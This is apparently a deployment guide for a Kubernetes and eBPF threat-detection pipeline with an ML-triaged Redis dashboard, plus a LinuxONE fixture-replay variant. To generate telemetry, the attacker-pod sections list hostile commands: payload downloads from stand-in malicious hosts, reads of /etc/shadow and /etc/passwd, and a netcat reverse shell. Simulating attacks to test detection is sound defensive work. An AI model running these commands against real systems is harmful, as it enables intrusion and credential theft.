# Security-Core: Complete Deployment Guide

End-to-end guide to run the full eBPF security pipeline — from Kubernetes cluster creation to a live dashboard with real threat data.

---

## Read this first: there are two deployment targets

This document describes **two different environments** that require
different tooling. Do not mix their steps.

| Target | Section | Requires | Capture mode |
|---|---|---|---|
| **x86_64 developer workstation** | Part A below | Docker, Kind, Helm, kubectl, live Tetragon | `live_tetragon` |
| **IBM LinuxONE `s390x`** | Part B at the end | Python 3.12, Redis. **No container runtime, no Tetragon.** | `fixture_replay` |

The LinuxONE instance used for the Datathon has **no Docker, no Podman, no
Kubernetes, and no Tetragon**, because no `s390x` build of Tetragon is
published upstream. Every Part A step fails there.

For verified LinuxONE evidence — architecture proof, dependency compatibility
table, and the deployment-option decision — see
**[`docs/LINUXONE_PREFLIGHT.md`](docs/LINUXONE_PREFLIGHT.md)**.

---

# Part A — x86_64 / Kind / live eBPF path

> Applies to developer workstations with Docker. **Not** the LinuxONE path.

---

## Architecture Overview

```
┌─── Linux Host ──────────────────────────────────────────────────────┐
│                                                                     │
│  ┌─── Kind Cluster ─────────────────────────────────────┐           │
│  │                                                       │           │
│  │  ┌── Tetragon DaemonSet ──┐  ┌── attacker-pod ─────┐ │           │
│  │  │  eBPF probes:          │  │  curl, nc, cat...    │ │           │
│  │  │  • process_exec        │  │  (generates threats) │ │           │
│  │  │  • kprobe: sys_connect │  └──────────────────────┘ │           │
│  │  │  + TracingPolicies     │                           │           │
│  │  └────────┬───────────────┘                           │           │
│  └───────────┼───────────────────────────────────────────┘           │
│              │ kubectl logs (JSON stream)                            │
│              ▼                                                       │
│  ┌── Event Forwarder (Python) ──────────────────────────┐           │
│  │  Transform → ML Triage (XGBoost) → Publish           │           │
│  │  Port 8081: /metrics, /health, /security/analyze     │           │
│  └──────────┬───────────────────────────────────────────┘           │
│             │ XADD security:events                                   │
│             ▼                                                        │
│  ┌── Redis ──────────────────────────────────────────────┐          │
│  │  Stream: security:events (last 10,000 events)         │          │
│  └──────────┬────────────────────────────────────────────┘          │
│             │ XREAD / XREVRANGE                                      │
│             ▼                                                        │
│  ┌── Dashboard API (dashboard_api.py) ───────────────────┐          │
│  │  Port 8080: /api/* endpoints + WebSocket               │          │
│  │  Reads Redis stream → enriches → serves to frontend    │          │
│  └──────────┬────────────────────────────────────────────┘          │
│             │ HTTP proxy + WebSocket                                  │
│             ▼                                                        │
│  ┌── React Dashboard (Vite) ────────────────────────────┐           │
│  │  Port 5173: Command Center, Incident Ledger,          │           │
│  │  Forensics Panel (MITRE, attribution, YAML fix)     │           │
│  └──────────────────────────────────────────────────────┘           │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

| Tool | Purpose | Install |
|---|---|---|
| **Docker** | Container runtime for Kind | [docs.docker.com/install](https://docs.docker.com/engine/install/) |
| **Python 3.11+** | Backend pipeline | `sudo apt install python3 python3-pip python3-venv` |
| **Node.js 18+** | Dashboard frontend | `curl -fsSL https://deb.nodesource.com/setup_18.x \| sudo -E bash - && sudo apt install nodejs` |
| **Redis** | Event stream | `sudo apt install redis-server && sudo systemctl start redis` |

`kind`, `kubectl`, and `helm` are **auto-downloaded** by `start_app.sh` if missing.

---

## Step-by-Step Deployment

### Step 1: Clone & Setup Python Environment

```bash
git clone https://github.com/KarthikR-ts/security-core.git
cd security-core

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install Python dependencies
pip install -r requirements.txt
```

### Step 2: Configure Environment Variables

Create a `.env` file (optional — needed for RAG/LLM features):

```bash
cat > .env << 'EOF'
# Required for RAG pipeline (optional for basic demo)
GOOGLE_API_KEY=your-gemini-api-key
PINECONE_API_KEY=your-pinecone-key
PINECONE_INDEX_HOST=your-pinecone-host

# Redis (defaults work if Redis is on localhost)
REDIS_HOST=localhost
REDIS_PORT=6379
EOF
```

> **Note:** Without API keys, the pipeline still works — ML triage and MITRE mapping run locally. Only the RAG-powered incident reports require Gemini/Pinecone.

### Step 3: Start Redis

```bash
# Check if Redis is running
redis-cli ping
# Should output: PONG

# If not running:
sudo systemctl start redis
# or
redis-server --daemonize yes
```

### Step 4: Run the Full Pipeline (Automated)

The `start_app.sh` script handles everything automatically:

```bash
chmod +x start_app.sh
./start_app.sh
```

This script performs 6 steps:

| Step | What it does |
|---|---|
| **1/6** | Downloads `kind`, `kubectl`, `helm` if missing |
| **2/6** | Creates a Kind K8s cluster with kernel debug/trace mounts |
| **3/6** | Deploys Tetragon eBPF agent via Helm + applies TracingPolicies |
| **4/6** | Deploys an `attacker-pod` (Alpine with curl/nc) into the cluster |
| **5/6** | Executes real attack commands: payload download, `/etc/shadow` read, reverse shell, process enumeration, DNS exfiltration |
| **6/6** | Pipes Tetragon's event logs through the ML triage + forwarder pipeline, publishing to Redis |

At this point, **real eBPF events are flowing into Redis** on stream `security:events`.

### Step 5: Start the Dashboard Backend

In a **new terminal**:

```bash
cd security-core
source .venv/bin/activate
python dashboard_api.py
```

You should see:
```
✅ Redis connected at localhost:6379
📊 Loaded N events from Redis into cache
============================================================
  SECURITY-CORE DASHBOARD API — LIVE
  Port: 8080
  Redis: localhost:6379 (connected)
  Forwarder: http://localhost:8081
============================================================
```

### Step 6: Start the Dashboard Frontend

In a **third terminal**:

```bash
cd security-core/dashboard
npm install      # first time only
npm run dev
```

Open **http://localhost:5173** in your browser.

---

## Manual Step-by-Step (Without start_app.sh)

If you want to run each component individually:

### a) Create Kind Cluster

```bash
kind create cluster --name security-cluster --config infra/kind-config.yaml

# Mount trace filesystems
docker exec security-cluster-control-plane mount -t tracefs tracefs /sys/kernel/tracing
docker exec security-cluster-control-plane mount -t debugfs debugfs /sys/kernel/debug
```

### b) Deploy Tetragon

```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system -f tetragon-values.yaml --wait

# Wait for readiness
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=tetragon -n kube-system --timeout=180s

# Apply TracingPolicies
kubectl apply -f security-policy.yaml
kubectl apply -f policies/
```

### c) Deploy Attacker Pod & Generate Events

```bash
kubectl run attacker-pod --image=alpine/curl:latest --restart=Never -- sleep 3600
kubectl wait --for=condition=ready pod attacker-pod --timeout=60s

# Execute attacks
kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh -o /dev/null
kubectl exec attacker-pod -- cat /etc/shadow
kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" &
kubectl exec attacker-pod -- ps aux
```

### d) Start the Forwarder Pipeline

```bash
# Stream Tetragon logs through the ML pipeline → Redis
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon \
    -c export-stdout -f --since=1m | python3 -m forwarder.main
```

### e) Start Dashboard API + Frontend

```bash
# Terminal 2:
python dashboard_api.py

# Terminal 3:
cd dashboard && npm run dev
```

---

## Generating More Events

To produce additional threat telemetry at any time:

```bash
# Download external payload
kubectl exec attacker-pod -- curl -sk https://malicious.site/shell.sh -o /tmp/shell.sh

# Credential access
kubectl exec attacker-pod -- cat /etc/passwd

# Reverse shell attempt
kubectl exec attacker-pod -- sh -c "nc -e /bin/sh 10.0.0.99 4444" &

# Process enumeration
kubectl exec attacker-pod -- ps aux

# File system modification
kubectl exec attacker-pod -- chmod 777 /tmp

# Network scanning
kubectl exec attacker-pod -- wget -q https://example.com -O /dev/null
```

Each of these is captured by Tetragon, processed by the ML pipeline, and appears live on the dashboard.

---

## Ports Summary

| Service | Port | Description |
|---|---|---|
| Security FastAPI | 8000 | Main analysis API (`main.py`) |
| Event Forwarder | 8081 | Forwarder metrics + `/security/analyze` |
| **Dashboard API** | **8080** | Dashboard backend → Redis stream consumer |
| Dashboard UI | 5173 | React frontend (Vite dev server) |
| Redis | 6379 | Event stream (`security:events`) |
| Tetragon gRPC | 54321 | eBPF telemetry endpoint |

---

## Cleanup

```bash
# Delete cluster
kind delete cluster --name security-cluster

# Stop Redis
sudo systemctl stop redis
```

---

# Part B — IBM LinuxONE `s390x` / native replay path

> This is the path used for the Datathon submission. Verified working on the
> allocated instance on 2026-10-18. Full evidence in
> [`docs/LINUXONE_PREFLIGHT.md`](docs/LINUXONE_PREFLIGHT.md).

## Why this path exists

The LinuxONE VM has no container runtime and no Tetragon `s390x` build. Rather
than emulate the Part A topology, the services are installed natively and fed
deterministic fixtures through **the same** normalize → redact → triage →
stream → dashboard pipeline.

What is genuinely proven on `s390x`: the application stack, the dependency
set, the redaction layer, and the full event path. What is **not** proven:
live kernel capture. Events are labelled `fixture_replay` in the API, the
UI, and the demo video.

## Prerequisites

| Requirement | Detail |
|---|---|
| Architecture | `s390x` — verify with `uname -m` before anything else |
| OS | Ubuntu 24.04 (Python 3.12 as the system interpreter) |
| Bootstrap | `python3-pip`, `python3-venv`, `redis-server` via `apt` |
| Memory | ~2.6 GiB usable; **no swap** |
| Egress | Must be open to PyPI, otherwise dependencies cannot be installed |

## Step 1 — Bootstrap

Ubuntu ships the base image **without `pip` and with `ensurepip` stripped**.
This is the one step that requires `sudo`.

```bash
sudo apt-get update
sudo apt-get install -y python3-pip python3-venv redis-server
sudo systemctl start redis-server
redis-cli ping                       # expect: PONG
```

Confirm Redis is loopback-only. It must not be world-reachable:

```bash
ss -ltn | grep 6379                  # expect 127.0.0.1:6379, not 0.0.0.0:6379
```

## Step 2 — Transfer the code

```bash
# On your workstation
tar -cf aegis-deploy.tar \
    --exclude=enterprise-attack.json \
    --exclude=.git \
    --exclude=node_modules \
    --exclude='*.pem' \
    -C /path/to/repo .
scp aegis-deploy.tar linux1@<host>:~/
```

```bash
# On LinuxONE
tar -xf ~/aegis-deploy.tar -C ~/aegis
```

`enterprise-attack.json` (46 MB MITRE dataset) is excluded — it is only
needed for opt-in RAG ingestion, which is disabled by default. If the
repository is private, `git clone` will not work without credentials.

## Step 3 — Environment

```bash
cd ~/aegis
python3 -m venv .venv
. .venv/bin/activate
cp .env.example .env      # placeholders only; never commit the real .env
```

Verify the safe defaults are actually in effect:

```bash
grep -E 'DRY_RUN|AUTONOMY|PRIVACY|LLM_EXTERNAL|OFFLINE_MODE' .env
```

Expected: `REMEDIATION_DRY_RUN=true`, `REMEDIATION_AUTONOMY_MODE=human-in-loop`,
`PRIVACY_REDACTION_ENABLED=true`, `LLM_EXTERNAL_ENRICHMENT_ENABLED=false`.

## Step 4 — Install dependencies (wheels only)

```bash
pip install --only-binary=:all: redis==5.0.3 pydantic==2.6.4 \
    fastapi==0.110.0 uvicorn==0.28.0 requests==2.31.0 pytest==8.1.1
pip install --only-binary=:all: \
    httpx pyyaml websockets python-dotenv prometheus-client
```

`--only-binary=:all:` is deliberate. It guarantees every package resolves to a
prebuilt wheel and fails loudly rather than attempting a source build.

| Do not install | Reason |
|---|---|
| `xgboost` | No `s390x` wheel. `ml_triage.py` falls back to heuristics automatically. |
| `numpy` / `scikit-learn` | No usable `s390x` wheel for this target. Unnecessary for the demo path. |
| `uvloop` | x86_64/arm64 only. Uvicorn uses the default asyncio loop. |
| `kubernetes` | Pulls `pydantic` 2.14 and breaks the documented pin. No `kubectl` exists here. |

On first run the forwarder logs:

```text
XGBoost not available; running in rule-based heuristic triage mode (s390x compatible).
```

This is the expected, documented degradation path — not an error.

## Step 5 — Verify

```bash
python scripts/smoke_test_replay.py
```

Must end with `ALL SMOKE TEST ASSERTIONS PASSED (100% SUCCESS)`. This asserts
schema version, capture mode, redaction markers, malformed-record
quarantine, and IPv4 masking end to end.

## Step 6 — Run the stack

```bash
bash scripts/aegis-ctl.sh start      # start | stop | restart | status
```

The forwarder has no API-only mode — it starts its API thread and then runs
its ingestion stream to completion. `aegis-ctl.sh` feeds it a **named FIFO**
that a writer re-opens on a loop, which keeps port 8081 alive and keeps
events arriving while `capture_mode` stays honestly `fixture_replay`.

## Step 7 — Access via tunnel

All services bind to `127.0.0.1`. Nothing listens on a public interface.

```bash
# On your workstation — keep this terminal open
ssh -i <key> linux1@<host> -L 8080:127.0.0.1:8080
```

The React frontend has **no `node`/`npm` on the LinuxONE host**. Build it on
your workstation (`cd dashboard && npm install && npm run build`) and serve
the static bundle through the tunneled API.

## Step 8 — Confirm health

```bash
curl -s http://127.0.0.1:8080/api/health | python -m json.tool
```

The `platform` block must report:

```json
{
  "capture_mode": "fixture_replay",
  "source_arch": "s390x",
  "hardware": "IBM LinuxONE (s390x)",
  "live_capture": false
}
```

`source_arch` is measured on the running host, not configured by hand.

## LinuxONE ports

| Service | Port | Bind | Notes |
|---|---|---|---|
| Redis | 6379 | `127.0.0.1` | Internal only. Never expose publicly. |
| Dashboard API | 8080 | `127.0.0.1` | Tunnel for access. |
| Forwarder API | 8081 | `127.0.0.1` | Internal only. |
| Tetragon gRPC | 54321 | — | Not listening; Tetragon is not running. |

`DASHBOARD_API_HOST` and `API_HOST` default to `127.0.0.1`. Override only with
a deliberate reason and authorisation.

## Teardown

See [`docs/TEARDOWN.md`](docs/TEARDOWN.md). Note that `docker compose down`
does not apply — no containers were ever created on this host.
